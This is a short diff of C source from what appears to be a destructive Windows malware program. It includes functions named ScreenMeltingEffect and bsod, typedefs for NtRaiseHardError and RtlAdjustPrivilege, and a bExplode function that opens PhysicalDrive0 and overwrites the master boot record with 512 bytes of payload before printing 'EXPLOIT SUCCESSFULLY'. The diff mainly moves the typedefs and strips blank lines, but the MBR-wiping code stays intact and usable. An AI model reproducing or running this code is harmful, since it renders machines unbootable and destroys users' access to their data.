@@ -141,46 +141,30 @@ void ScreenMeltingEffect() {
 
 
 
-// typedefs. we need these to call internal windows functions.
-
-typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
-
-typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-
-
-
 BOOL bExplode(void) {
 
     DWORD dwBytesWritten;
-
-
-
     HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0",
-
         GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
-
         0, OPEN_EXISTING, 0, 0); // File handle on the physical drive
-
-
     if (WriteFile(hDevice, mbrcode, 512, &dwBytesWritten, 0)) { // write the code for the MBR to the first 512 bytes of the HDD
 
         printf("[*] EXPLOIT SUCCESSFULLY");
 
     }
 
-
-
     CloseHandle(hDevice); // close handle
 
-
-
     return TRUE;
-
 }
 
 
 
 
+// typedefs. we need these to call internal windows functions.
+
+typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
 
 int bsod() {
